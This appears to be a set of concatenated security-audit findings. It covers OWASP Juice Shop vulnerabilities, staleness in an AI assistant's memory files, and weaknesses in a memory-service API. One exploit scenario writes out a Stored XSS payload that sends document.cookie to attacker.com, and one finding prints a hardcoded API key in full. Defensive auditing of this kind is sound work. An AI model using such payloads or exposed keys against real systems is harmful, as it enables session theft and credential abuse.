exploit_scenario: 1. Attacker gains read access to the database (via SQL injection elsewhere in Juice Shop, or backup exposure). 2. totpSecret column contains all users' TOTP seeds in plaintext. 3. Attacker can generate valid TOTP tokens for any user at any point in time, permanently bypassing 2FA. 4. Combined with MD5 password hashes, a database dump yields full account takeover capability for 2FA-enabled accounts.
framework_protection: Sequelize does not transparently encrypt column values. No application-level encryption wrapper is applied.
fix_recommendation: Encrypt TOTP secrets at rest using AES-256-GCM with a key loaded from a secrets manager (not stored in the database). Use a Sequelize virtual field or model hook to transparently encrypt/decrypt.

question: Q6
title: Hashids Salt Hardcoded in Source — Predictable Encoding of Challenge/Order IDs
data_flow: Three hardcoded Hashids salts → encode challenge IDs into 'continue codes' → exposed via GET /rest/continue-code, /rest/continue-code/find-it, /rest/continue-code/fix-it. Anyone with the salt can decode any continue code to enumerate solved challenge IDs.
exploit_scenario: 1. Attacker reads source code to obtain all three salts. 2. Attacker instantiates Hashids with identical salts client-side. 3. Attacker decodes any continue code from another user to determine exactly which challenges they have solved. 4. Attacker can also forge continue codes to claim arbitrary challenge completions if the restore endpoint does not validate server-state.
framework_protection: Hashids is not designed as a security primitive — it is obfuscation only. The library documentation explicitly warns against using it for security purposes.
fix_recommendation: Load salts from environment variables. For challenge restore codes, use cryptographically signed tokens (e.g., HMAC-SHA256 with a secret key) rather than Hashids, so that forgery is detectable.

question: Q2
title: dataExport includes likedBy array exposing other users' email addresses
exact_code:
reviews: reviews.map((review) => ({
  message: review.message,
  author: review.author,
  productId: review.product,
  likesCount: review.likesCount,
  likedBy: review.likedBy
}))
data_flow: The data export endpoint (POST /rest/user/data-export) includes the full `likedBy` array in every review. This array contains the email addresses of every user who liked that review — third-party PII that does not belong in the requesting user's GDPR export.
exploit_scenario: A user requests their own data export and receives the email addresses of all other users who liked shared reviews, enabling account enumeration and targeted phishing without any elevated privilege.
framework_protection: No field filtering is applied before the JSON response is sent.
fix_recommendation: Exclude the `likedBy` field from exports, or replace it with an anonymised count. Return only `likesCount` to the end user.

question: Q4
title: Chatbot error response echoes raw exception message to client
data_flow: When the bot's secondary recovery attempt (line 625) also throws, the raw error message from `utils.getErrorMessage(err)` is embedded directly into the HTTP 200 response body returned to the user. This can include stack trace excerpts, internal library errors, file paths, or database-level error messages depending on the error source.
exploit_scenario: An attacker crafts a chatbot query that causes an internal error (e.g. by injecting malformed input that crashes the NLP pipeline). The response reveals internal error details — file system paths, module names, or database schema information — that assist further exploitation (e.g. path traversal, targeted injection).
framework_protection: No error sanitisation layer exists between the caught exception and the JSON response.
fix_recommendation: Replace the error echo with a static recovery message: `body: 'I encountered an error and am recovering. Please try again shortly.'`. Log the actual error server-side.

question: Q4
title: dataErasure renders raw error.message in server-side template and passes it to next()
data_flow: If the pug template render fails (e.g. when processing attacker-controlled `layout` or `req.body` spread into the template context), the raw `error.message` from pug's compile error is wrapped in a new Error and passed to next(). Express's error handler may return this to the client as a 500 response with details, depending on the NODE_ENV setting.
exploit_scenario: In development mode (or if the app is misconfigured for production), Express returns a full stack trace including pug internals, file system paths, and the template content that caused the error. In conjunction with the LFI vector in the `layout` parameter, this could reveal the content of partially-read files.
framework_protection: Express only suppresses stack traces in production mode (`NODE_ENV=production`). If not set, stacks are returned.
fix_recommendation: Set `NODE_ENV=production` in deployment. Implement a custom error handler that returns generic 500 messages for template errors. Sanitise all user-supplied values before spreading into template context (`...req.body` is particularly dangerous here).

question: Q6
title: MemoryModel.findAll uses SELECT * including sensitive UserModel columns via eager JOIN
exact_code: const memories = await MemoryModel.findAll({ include: [UserModel] })
data_flow: No `attributes` restriction is applied to either MemoryModel or the included UserModel. Sequelize generates `SELECT memories.*, Users.* FROM memories LEFT JOIN Users`. All UserModel columns — including password hash, totpSecret, deluxeToken, lastLoginIp — are fetched from the database and loaded into memory before serialisation.
exploit_scenario: Even if the API response were later filtered (it isn't), the database still transmits and Node.js still loads full user records for every memory record. A memory leak or unintended serialisation path could expose the over-fetched columns. This represents both an unnecessary data exposure risk and a performance issue at scale.
framework_protection: Sequelize does not auto-exclude sensitive columns. The developer must explicitly declare `attributes: { exclude: [...] }` or define a `defaultScope` on the model.
fix_recommendation: Add column restrictions: `MemoryModel.findAll({ include: [{ model: UserModel, attributes: ['id', 'username', 'profileImage'] }], attributes: ['id', 'caption', 'imagePath', 'UserId'] })`. Consider adding a `defaultScope` to UserModel that permanently excludes `password`, `totpSecret`, and `deluxeToken`.

question: Q5
title: Unsanitized True-Client-IP header stored as lastLoginIp enabling Stored XSS
data_flow: True-Client-IP HTTP header (any authenticated request) → when httpHeaderXssChallenge enabled, stored as-is in User.lastLoginIp DB column → reflected in API responses
exploit_scenario: When httpHeaderXssChallenge is active, an authenticated attacker sends any request with True-Client-IP: <script>fetch('https://attacker.com/?c='+document.cookie)</script>. The raw value is stored to the database. If an admin panel renders lastLoginIp as HTML without encoding, this becomes Stored XSS against admin users.
framework_protection: bypassed
fix_recommendation: Sanitize lastLoginIp before storage unconditionally. For challenge detection, check the raw value first, then sanitize before calling user.update(). Add a regex validator to ensure lastLoginIp matches a valid IP address pattern.

question: Q2
title: Cookie parser uses hardcoded secret 'kekse'
exact_code: app.use(cookieParser('kekse'))
data_flow: The cookieParser secret is used to sign and verify signed cookies. The string 'kekse' (German for 'cookies') is trivially guessable and publicly visible in source. Any signed cookie value can be forged by an attacker who knows this secret.
exploit_scenario: 1. Attacker reads the source or the repository. 2. Attacker uses the known secret 'kekse' to sign a cookie with a crafted payload. 3. If any route trusts req.signedCookies without further JWT validation, the attacker's forged value is accepted as authentic.
framework_protection: Cookie secrets must be randomised, stored in environment variables, and rotated periodically. They should never appear in source code.
fix_recommendation: Replace with: app.use(cookieParser(process.env.COOKIE_SECRET ?? crypto.randomBytes(32).toString('hex'))). Set COOKIE_SECRET in the deployment environment.

question: Q3
title: HSTS (HTTP Strict-Transport-Security) header not set
data_flow: helmet is imported but only noSniff and frameguard are activated. helmet.hsts() is never called. Without HSTS, browsers will not enforce HTTPS-only connections on subsequent visits. The application can be accessed over plain HTTP, enabling network-level interception of authentication tokens and session data.
exploit_scenario: 1. Application deployed behind a TLS terminator but without HSTS. 2. Attacker performs a network MITM (e.g., public WiFi). 3. Victim's browser follows an HTTP link to the shop (redirect from port 80). 4. Attacker intercepts the HTTP leg before the redirect, capturing the session token or injecting malicious content. 5. HSTS would prevent this by instructing the browser to always use HTTPS after the first visit.
framework_protection: helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true }) should be applied for all production deployments running behind TLS.
fix_recommendation: Add: app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true })) inside the middleware block in server.ts. Ensure the application forces HTTPS redirect at the load-balancer level.

question: Q5
title: Swagger API documentation publicly accessible at /api-docs
data_flow: The Swagger UI is mounted at /api-docs with no authentication middleware. It renders the full swagger.yml which documents all B2B v2 API endpoints, their expected parameters, authentication requirements, and response schemas. This provides attackers with a complete attack surface map.
exploit_scenario: 1. Unauthenticated GET to /api-docs loads the full interactive API documentation. 2. Attacker identifies all available endpoints, HTTP methods, and parameter structures. 3. Attacker uses the 'Try it out' Swagger UI feature to make live API calls directly from the documentation page. 4. This significantly reduces the reconnaissance effort required for targeted attacks.
framework_protection: API documentation endpoints should be disabled in production or protected behind authentication. Access should be restricted to internal/developer networks.
fix_recommendation: In production builds: if (process.env.NODE_ENV !== 'production') { app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument)); } Or add: app.use('/api-docs', security.isAuthorized(), security.isAdmin(), swaggerUi.serve, swaggerUi.setup(swaggerDocument)).

question: Q6
title: Raw error objects serialized and returned to clients in multiple routes
data_flow: Multiple routes serialize the raw error object directly into the JSON response: likeProductReviews.ts line 56, updateProductReviews.ts line 27, createProductReviews.ts line 32. A MongoDB or Node.js Error object serialized via JSON.stringify() exposes: the error message (which may contain query details, collection names, or driver internals), the error code, and on some error types, a partial stack property. This leaks database schema and driver version information.
exploit_scenario: 1. Attacker sends a malformed NoSQL query to PUT /rest/products/:id/reviews (updateProductReviews). 2. The MongoDB driver throws an error with a message like 'Cast to ObjectId failed for value "x" at path "_id"'. 3. Server responds with res.status(500).json(err) — the full error object including message and code fields is returned. 4. Attacker learns the database is MongoDB, the field type is ObjectId, and can tailor a NoSQL injection payload accordingly.
framework_protection: Error handlers must log the full error internally and return only a sanitized generic message to the client. Use utils.getErrorMessage() consistently (which the codebase does in some routes) or a centralized error handler.
fix_recommendation: Replace res.status(500).json(err) with res.status(500).json({ error: 'An internal error occurred. Please try again.' }) in all three affected routes, and log the raw error with logger.error(err) for internal diagnostics.

question: Q4
title: Hardcoded Alchemy API key in WebSocket provider URL — secret exposure
exact_code: const provider = new WebSocketProvider('wss://eth-sepolia.g.alchemy.com/v2/FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJ')
data_flow: Hardcoded Alchemy API key embedded in source code. The WebSocket provider URL is not user-controlled for the connection target, but req.body.walletAddress is stored in a Set without address format validation and matched against blockchain events.
exploit_scenario: The Alchemy API key 'FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJ' is visible in source and version control. Any party with repo access can exhaust API quotas, monitor all Sepolia transactions under this key, or enumerate contract interactions. Separately, walletAddress from req.body is added to walletsConnected without format validation — any string value, including non-address garbage or injection payloads, is accepted and stored.
framework_protection: None for key exposure. The contract event listener requires the exploiter address to match blockchain event data, constraining the challenge solve path but not the API key abuse scenario.
fix_recommendation: Move API keys to environment variables (process.env.ALCHEMY_API_KEY). Rotate the exposed key immediately. Validate walletAddress against Ethereum address format (0x followed by exactly 40 hex characters) before storing in any collection.

question: Q5
title: Prototype pollution risk via unvalidated req.body.query used as username and object key
data_flow: req.body.query (arbitrary user string, setname action) -> UserModel.update({username: req.body.query}) -> bot.addUser(id, username). The raw query value is passed as a username to the bot library, which may use it as a plain object key internally.
exploit_scenario: Attacker sends action=setname with query='__proto__'. If the juicy-chat-bot library stores users in a plain object using bracket notation without hasOwnProperty guards, this poisons Object.prototype. Subsequent property lookups on any plain object in the process then return attacker-influenced values — potentially bypassing auth checks, flag logic, or object existence tests.
framework_protection: Sequelize's update() is parameterized and safe for the DB write. The prototype pollution risk exists in the downstream bot library's usage of the username string as an object map key. No input sanitization is applied to req.body.query before use as username.
fix_recommendation: Sanitize username input to reject reserved JS property names (__proto__, constructor, prototype). Use Map instead of plain objects for user registries inside bot libraries. Apply a username length and character whitelist before passing to bot.addUser().

question: Q6
title: Open redirect with allowlist bypass enables client-side and chained server-side SSRF
data_flow: HTTP GET ?to=<user_input> -> security.isRedirectAllowed(toUrl) -> res.redirect(toUrl). The 'to' parameter is fully user-controlled. isUnintendedRedirect() uses utils.startsWith() for prefix matching against the allowlist — vulnerable to domain confusion attacks.
exploit_scenario: If allowlisted URLs include 'https://github.com/bkimminich', an attacker submits to=https://github.com/bkimminich.attacker.com. utils.startsWith() passes this as it begins with the allowlisted prefix. The redirectChallenge confirms a bypass path exists. In a chain: any server-side component that follows redirects (webhook processor, SSR renderer, PDF generator) would be directed to an attacker-controlled or internal target — constituting SSRF.
framework_protection: security.isRedirectAllowed() provides partial protection. The redirectChallenge confirms bypass is possible. The allowlist is not enforced using strict hostname comparison.
fix_recommendation: Replace startsWith prefix matching with strict URL parsing: use the URL constructor to parse both the target and each allowlisted URL, then compare the hostname property exactly. Reject any URL where the parsed hostname does not exactly equal an allowlisted hostname.

question: Q2
title: fs-extra 9.1.0 - Three Major Versions Behind Current Stable (11.x)
data_flow: fs-extra provides file system utilities used for copying challenge files, reading user uploads, and managing runtime directories throughout the application
exploit_scenario: fs-extra 9.x is three major versions behind current stable 11.x. While no critical CVEs are directly attributed to fs-extra independently, outdated file system manipulation libraries in security-sensitive code paths (file upload handling, challenge verification) can interact with and amplify other vulnerabilities. The ^9.1.0 range blocks migration to improved atomic write operations and symlink handling behavior fixes introduced in versions 10.x and 11.x.
framework_protection: fs-extra is a thin wrapper over the Node.js built-in fs module, limiting its independent vulnerability surface area.
fix_recommendation: Upgrade to fs-extra ^11.0.0. Check for breaking API changes in move() and copy() method signatures and behavior.

question: Q3
title: Error message in dataExport includes partially-masked email in exception text passed to next()
exact_code:
next(new Error(`Error retrieving orders for ${updatedEmail}`))
...
next(new Error(`Error retrieving reviews for ${updatedEmail}`))
data_flow: `updatedEmail` is the user's email with vowels replaced by asterisks (e.g. `*dm*n@j**c*-sh.op`). This partially masked value is embedded in the Error object passed to next(). Express's default error handler and many logging middlewares will log the error message including this value and potentially the request URL.
exploit_scenario: Minimal direct PII exposure, but the pattern leaks the email structure in error logs. In combination with other metadata this allows user identification in logs. If detailed errors are ever surfaced to users (Q4), the masked email is disclosed.
framework_protection: Express error handlers receive the full Error object. Without a sanitising error handler, this value propagates to logs.
fix_recommendation: Use a generic error message without user-identifying content: `next(new Error('Error retrieving user data'))`. Log the detailed context server-side only at DEBUG level with proper log access controls.

question: Q1
title: SAP confidence floor stated twice with inconsistent framing
finding: MEMORY.md states the confidence floor was raised from 0.5 to 0.6 as part of SAP v1.2. sap-benchmarks.md independently recommends 'raise confidence threshold to 0.6' as a future SAP v1.2 recommendation. The benchmarks file appears not to have been updated to reflect that this recommendation was already implemented in v1.2, creating the impression it is still a pending action item.
exact_quote:
MEMORY.md: "Confidence floor: 0.5 → 0.6 (low-confidence seeding caused permanent Codex failures)"
sap-benchmarks.md: "SAP v1.2 recommendations: Accept `---SAP v1.1` variant; raise confidence threshold to 0.6; add two-shot examples for Claude; circuit breaker for chain abort."
recommendation: Update sap-benchmarks.md to mark completed recommendations (confidence floor, ---SAP v1.1 acceptance) as DONE, and clearly flag which recommendations are still pending (two-shot examples for Claude, circuit breaker for chain abort).

question: Q2
title: Pi Integration project listed as ~100% but presumably complete — stale project status
finding: The Active Projects table lists Pi Integration at '~100%' status. A project at 100% is either done (and should be moved to a completed section) or effectively complete with no further work planned. Keeping it in 'Active Projects' alongside genuinely active projects (~60%, ~90%) creates false signal about current workload and priorities.
exact_quote: "| Pi Integration | Open-source terminal agent — Gemini + Codex via OAuth, unified dispatch, `--watch` TUI mode | ~100% |"
recommendation: Move Pi Integration to a 'Completed Projects' or 'Shipped' section in MEMORY.md, or remove it from the Active Projects table with a note in a separate shipped-projects list. Reserve the Active Projects table for items with active development.

question: Q2
title: KLLM Roadmap phases listed as 'not yet implemented' — may be stale from early-stage repo
finding: research-papers.md lists KLLM roadmap phases (4, 5, 6) as 'not yet implemented' with no date. The repo was described as 'early-stage' with 6 stars. Given that this is an external GitHub repo that may have progressed, these 'not yet implemented' annotations could be outdated. No date is attached to the observation.
exact_quote:
"### Roadmap Phases (not yet implemented)
- Phase 4: Context-aware personalization + Sentinel AI...
- Phase 5: Model compression...
- Phase 6: SDK for developers..."
recommendation: Add a last-checked date to the KLLM entry (e.g., 'As of Feb 2026, these phases were not implemented'). For external repos, note the observation date to distinguish stale observations from current state.

question: Q2
title: SAP v1.2 backlog items numbered 3-5 — items 1-2 missing or imply prior state
finding: The 'Remaining backlog' section in MEMORY.md lists items starting at number 3: '3. delta_from_prior field', '4. MERGE weights', '5. alternatives[]'. Items 1 and 2 are absent, implying they were completed but no completion note was left. This is a minor record-keeping gap but makes the backlog look truncated.
exact_quote:
"### Remaining backlog — See [sap-v1.2-backlog.md](...)
3. `delta_from_prior` field — what this hop added vs input
4. MERGE weights — `confidence × impact` for multi-agent fan-out synthesis
5. `alternatives[]` — competing narratives field in findings"
recommendation: Either add a note '1. [DONE: confidence floor raised] 2. [DONE: ---SAP v1.1 accepted]' before items 3-5, or renumber 3-5 as 1-3 and add a brief 'Previously completed: ...' line.

question: Q3
title: Gemini dispatch gotcha (stdin redirect, no -p flag) duplicated in MEMORY.md and research-papers.md
file: MEMORY.md (Living Research System section), research-papers.md (SAP section implicitly), also CLAUDE.md global rules
finding: The rule 'Gemini uses stdin redirect (gemini --approval-mode yolo < prompt.txt) — prompts with ---SAP break the -p arg parser' appears in multiple places: MEMORY.md under the Living Research System entry, and it is also captured in the global CLAUDE.md rules file under Gemini pitfalls. This creates three sources for the same operational constraint.
exact_quote:
MEMORY.md: "Dispatch: Gemini uses stdin redirect (`gemini --approval-mode yolo < prompt.txt`) — prompts with `---SAP` break the `-p` arg parser"
CLAUDE.md global rules: "For non-interactive (headless) dispatch: use stdin redirect (`gemini --approval-mode yolo < prompt.txt`) NOT `-p '...'. Long prompts or prompts containing `---` break the `-p` flag argument parser."
recommendation: The CLAUDE.md global rules is the correct place for this operational constraint (it applies globally). The MEMORY.md Living Research System entry can drop this detail and just say 'dispatch uses stdin redirect (see global rules)'. Reduces maintenance surface.

question: Q5
title: MEMORY.md links to proto-pel.md which is in orchestration directory, not memory directory
finding: Under Early Prompts Collection, MEMORY.md references 'See `~/.claude/orchestration/proto-pel.md`'. The filesystem listing confirms proto-pel.md is in the orchestration directory. The reference is an absolute path (not a memory-relative link) so it is technically correct, but it creates an implicit dependency on an external file that is outside the memory file set.
exact_quote: "See `~/.claude/orchestration/proto-pel.md`"
recommendation: No immediate action required — the path is explicit. Add a brief note that proto-pel.md is an orchestration artifact, not a memory file, to prevent confusion during future memory audits.

title: Validator chain is fail-closed overall but Gate 1.5 (firewall) executes AFTER Gate 1 succeeds — gate ordering inversion risk
finding: The gate ordering in validate_memory_write() is: (1) Pydantic schema → (1.5) content firewall → (2) forbidden-key scan. The comment in the route docstring lists gates as '1. Schema validation, 2. Forbidden-key scan, 3. Bounds checks, 4. Provenance presence check' — the content firewall (gate 1.5) is not listed in the route docstring at all. This is a documentation gap, not a code bug, but the undocumented gate ordering means future developers may reorder or remove Gate 1.5 without understanding its constitutional role. The chain IS fail-closed (every gate raises MemoryError on failure) and no step short-circuits to allow later gates to be skipped. No except-pass pattern was found (v1 LC-7 is fixed in v2).
exact_lines:
# Gate 1-4: Validate against M5.2 schema (includes forbidden-key scan)
validated_request = await asyncio.to_thread(validate_memory_write, payload)
# ... route docstring lists: '1. Schema validation 2. Forbidden-key scan 3. Bounds checks 4. Provenance presence check'
exploit_scenario: Minimal risk currently. Risk is that a future developer adds a new gate after reading only the route docstring (which omits the content firewall gate) and inadvertently positions it in a way that bypasses the firewall.

title: references[] items have no max_length per entry and no format validation
finding: MemoryWriteRequest.references is `Optional[List[str]] = Field(None, max_items=50, ...)`. The max_items=50 cap is enforced. However, individual reference strings have no max_length and no format validation (e.g., no UUID check, no URI validation). A caller can submit 50 references each containing a 10MB string. The content firewall does NOT scan references fields. The forbidden-key scan checks key names (not values). These strings are stored as JSON in the references_json column and returned in recall responses.
exact_lines:
references: Optional[List[str]] = Field(
    None,
    max_items=50,
    description="Opaque IDs or hashes only"
)
exploit_scenario: Attacker sends 50 references each containing a large string. Total payload per write: up to 50 × unbounded. These are stored in the database and returned in every recall response that matches this memory item.

title: jurisdiction field flows from caller to query filter without format validation
lines:
jurisdiction: Optional[str] = None  (VectorFilters, line ~937)
jurisdiction: str  (VectorMetadata, line ~893)
if not self.jurisdiction:
    raise ValueError("jurisdiction is required")  (line ~911-912)
failure_mode: The jurisdiction field on both VectorMetadata and VectorFilters accepts any arbitrary string from the caller. There is no allowlist, regex, or length constraint enforced at the protocol layer. When this string is forwarded to an external vector store (e.g., Qdrant metadata filter), an attacker who controls the jurisdiction value can inject store-specific filter expressions or escape the intended field boundary. The only validation is a truthiness check (not self.jurisdiction), which rejects empty strings but permits any non-empty content including control characters, injection payloads, and cross-tenant jurisdiction names. A caller with a valid API key for jurisdiction 'us-west' can supply jurisdiction='eu-gdpr' and receive records belonging to a different governance domain — a direct cross-tenant/cross-jurisdiction data leak.

title: allowed_classes and memory_ids filter fields accept unsanitized caller-supplied lists
lines:
allowed_classes: Optional[List[str]] = None  (VectorFilters, line ~938)
memory_ids: Optional[List[str]] = None  (VectorFilters, line ~942)
failure_mode: Both allowed_classes and memory_ids are passed directly from caller input into VectorFilters with no element-level validation, no allowlist enforcement, and no size cap. allowed_classes is described as a 'whitelist' but the protocol never verifies that the submitted class strings are members of any server-side enumeration of valid classes. An attacker can submit arbitrary strings as class values to probe store structure. memory_ids accepts an unbounded list — a caller can submit tens of thousands of IDs to trigger an oversized IN-clause against the vector store, causing denial of service or data exfiltration of targeted records across tenants if ID format is predictable (e.g., UUID sequences).

title: FORBIDDEN_METADATA_KEYS check uses case-folded key names only — does not validate key format or length
lines:
found_forbidden = [
    key for key in metadata_dict.keys()
    if key.lower() in FORBIDDEN_METADATA_KEYS
]  (lines ~846-849)
failure_mode: validate_metadata_keys performs case-insensitive matching against a frozenset of banned key names. It does not: (1) validate that key names are alphanumeric/underscore-only (permitting keys with null bytes, newlines, or path separators that might be treated differently by downstream stores), (2) enforce a maximum number of metadata keys (allowing metadata bloat that inflates index size and could be used for storage exhaustion), or (3) enforce a maximum key or value length. An attacker can bypass the forbidden-key block by using Unicode look-alikes (e.g., 'ᴄonfidence' does not lowercase to 'confidence' in Python str.lower() for all code points) or by stuffing unlimited metadata.

title: No upper bound on k parameter in the VectorAdapter.query protocol signature
lines:
async def query(
    self,
    embedding: List[float],
    filters: VectorFilters,
    k: int,
) -> List[VectorResult]:  (lines ~1046-1051)
failure_mode: The query protocol signature accepts k as an unbounded int. There is no MAX_K constant defined at the protocol level, no validation in __post_init__, and no guard in InMemoryAdapter._query_raw before computing k * pre_filter_multiplier. A caller supplying k=2147483647 causes _query_raw to attempt to allocate a slice of up to 10 billion results (k * 5), exhausting memory and enabling a full data dump of the store's contents in a single request. The issue exists at the protocol contract level — conformant adapters are not required to enforce their own limits.

title: InMemoryAdapter health response leaks internal store size
failure_mode: The health() method returns the exact count of vectors in the store in a details field. If the health endpoint is accessible without authentication (common in health-check configurations for load balancers), this leaks the total number of stored memory records to unauthenticated callers. Combined with predictable memory_id formats, an attacker can use this count to calibrate enumeration attacks or infer governance boundaries.

title: Race condition in InMemoryAdapter: concurrent upsert and update_lifecycle on same ID
lines:
embedding, old_meta = self._vectors[id]  (line ~1234)
self._validate_lifecycle_transition(old_meta.lifecycle_state, new_state)
new_meta = VectorMetadata(...)
self._vectors[id] = (embedding, new_meta)  (lines ~1234-1248)

async def upsert(...) -> None:
    self._vectors[id] = (list(embedding), metadata)  (line ~1172)
failure_mode: InMemoryAdapter uses a plain dict (_vectors) with no locking. Python's asyncio is cooperative, but both upsert and update_lifecycle are async functions that yield at I/O points. If an awaitable operation were introduced between the read (line ~1234) and write (line ~1248) in update_lifecycle, a concurrent upsert could replace the entry between the lifecycle validation and the metadata write, resulting in the new embedding being paired with the old-state metadata or vice versa. While currently safe given the purely synchronous dict operations, the pattern is fragile and will produce a TOCTOU race condition if any await is added to the gap (e.g., logging, governance hooks) without adding a lock.

title: InMemoryAdapter.clear() has no access control — any caller can purge the entire store
failure_mode: clear() is a public method on the adapter class with no authentication, authorization, or caller-identity check. If the InMemoryAdapter instance is reachable through any service layer that does not gate this method behind a privilege check, any actor who obtains a reference to the adapter (or any route that proxies to it) can destroy the entire vector store atomically. The docstring says 'testing use only' but this is not enforced at runtime.

title: VectorResult.authoritative forced to False via object.__setattr__ — bypass via dataclass inheritance
failure_mode: The invariant is enforced in __post_init__ via object.__setattr__, which works for direct instantiation of VectorResult. However, VectorResult is a non-frozen dataclass (no frozen=True). Any subclass that overrides __post_init__ without calling super().__post_init__() can set authoritative=True before the parent guard runs. Additionally, after construction, the field is mutable — any code holding a reference can write result.authoritative = True directly since the dataclass is not frozen. The constitutional invariant 'authoritative is ALWAYS False' can be silently violated at runtime.

title: admission_receipt_hash field accepted as opaque string with no hash format validation
failure_mode: admission_receipt_hash is documented as 'SHA-256 hash of the admission receipt' but is validated only for non-emptiness. Any non-empty string is accepted — including strings that are not valid SHA-256 hex digests. An attacker or buggy client can supply a trivially fake value ('x', 'BYPASS', etc.) and the metadata will be persisted. There is no length check (64 hex chars), no hex-character validation, and no cryptographic verification that the hash corresponds to an actual admission receipt. This undermines the audit trail integrity the field is designed to protect.

title: Request size limit bypassed by omitting Content-Length header
lines: 146-157: content_length = request.headers.get('content-length') / if content_length: / ... / except ValueError: pass  # Invalid content-length header, let it through
failure_mode: The RequestSizeLimitMiddleware only enforces the body size limit when the client sends a Content-Length header. A client can omit the header entirely (streaming/chunked transfer) and deliver an arbitrarily large body with no rejection. The check is also on the declared value only — a lying client can send a small Content-Length and stream more data. The 'let it through' comment on ValueError confirms the intent to skip, but opens a gap for malformed headers. Effective DoS vector for storage exhaustion or memory exhaustion upstream.

title: Middleware stack ordering: RequestSizeLimitMiddleware runs AFTER RateLimitMiddleware
lines: 160: app.add_middleware(RequestSizeLimitMiddleware) / 312: app.add_middleware(RateLimitMiddleware)
failure_mode: FastAPI/Starlette adds middleware in reverse registration order — the last middleware added runs first. RateLimitMiddleware is added second (line 312), so it executes before RequestSizeLimitMiddleware. This means rate limiting is checked before body size is enforced. As a consequence, a request carrying an oversized body can consume the rate-limit check and route lookup overhead before being rejected for size. More critically, paths NOT in the rate-limited sets (i.e., most non-write/recall/maintenance paths) skip rate limiting entirely and still land in RequestSizeLimitMiddleware — but since size checks only enforce when Content-Length is present, arbitrary large bodies reach the route handler on any non-limited path.

title: Rate limiting is actor-identified by a client-controlled header (X-API-Key)
lines: 248: actor_id = request.headers.get('X-API-Key') or request.client.host or 'unknown'
failure_mode: The actor key used for rate-limit bucketing is taken directly from the X-API-Key header before authentication. An unauthenticated caller can supply any arbitrary value in X-API-Key to pollute any other actor's rate-limit counter, or cycle through synthetic keys to avoid exhausting their own bucket. Because the RateLimitMiddleware runs before any authentication dependency (auth is enforced inside individual route handlers via FastAPI Depends), a pre-auth attacker can both exhaust a legitimate actor's quota and evade their own limit.

title: Rate limiting only applied to POST/PUT on explicit path set — GET write-equivalent paths unprotected
lines: 243-245: if request.method not in ('POST', 'PUT'): / return await call_next(request)
failure_mode: The RateLimitMiddleware explicitly skips all non-POST/PUT methods. If any route handler accepts GET (or DELETE/PATCH) with write semantics — particularly in the many routers included (oversight, erasure, override, retention, risk, compliance_reports, projection, sidecar) — those operations are completely unrate-limited regardless of path membership. Additionally, GET requests to paths in _RECALL_PATHS are not rate-limited, enabling unrestricted recall queries.

title: No rate limiting on /health, /, /metrics, /export/*, /compliance/* endpoints
lines: 239-241: else: / # Not a rate-limited path / return await call_next(request)
failure_mode: /health performs live DB queries on every call (SELECT 1 and schema verification) with no rate limit. /metrics, /export/*, oversight, projection, compliance, and sidecar endpoints are all unlisted from rate-limited paths. An attacker can drive unbounded load to /health or /metrics to exhaust DB connections or CPU with no throttling. The DB-touching health check is particularly dangerous as it has no connection-limit guard.

title: /health leaks internal error strings in response body
lines: 357-358: db_error = str(e) / ... 391-392: response['checks']['database']['error'] = db_error
failure_mode: Database exceptions — which may contain table names, column names, driver error strings, file paths (for SQLite), or DSN fragments — are converted to strings and returned verbatim to unauthenticated callers. /health has no authentication requirement. An attacker can probe the health endpoint to gather schema/infrastructure details for further exploitation.

title: /health endpoint is unauthenticated and exposes internal operational state
lines: 319-397: @app.get('/health', tags=['system']) / async def health(): ...
failure_mode: The health endpoint is fully public — no auth dependency. It discloses: database type (sqlite vs postgres), schema existence (m52_memories table), operation mode, frozen_mode value, schema_ok status, and in failure cases the raw exception string. This is reconnaissance-grade information for an attacker mapping the service. At minimum it should return a reduced payload to unauthenticated callers, or require authentication.

title: / root endpoint exposes /docs path regardless of docs being disabled
lines: 405-411: return {'service': 'CMv1 Memory Service', 'version': '1.0.0-prod', 'mode': 'production', 'docs': '/docs', 'health': '/health'}
